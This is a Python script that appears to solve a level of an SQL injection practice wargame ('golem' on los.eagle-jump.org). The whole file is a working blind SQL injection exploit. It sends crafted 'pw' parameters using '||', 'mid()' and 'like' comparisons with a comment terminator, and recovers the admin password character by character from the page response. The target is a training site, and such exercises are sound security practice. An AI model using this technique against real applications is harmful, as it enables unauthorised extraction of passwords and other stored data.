import requests
import string

url = 'https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php'

mycookie = {
    'PHPSESSID': ''
}

letters = string.digits + string.ascii_letters
ans = ""
"""
response = requests.get(url + "?pw=' || id in('admin') "+ "%26" + "%26" +  " mid(pw, 1, 1) like 8 %23", cookies=mycookie)
if 'Hello admin' in response.text:
    print(response.text)
"""

for i in range(1, 9):
    for char in letters:
        print(char)
        response = requests.get(url + "?pw=' || id in ('admin') " + "%26" + "%26" + " mid(pw, {index}, 1) like \'{char}\' -- #".format(index = i, char = char), cookies=mycookie)        
        # print(len(response.text))
        if 'Hello admin' in response.text:
            ans += char
            print(char)
            break
print(ans)
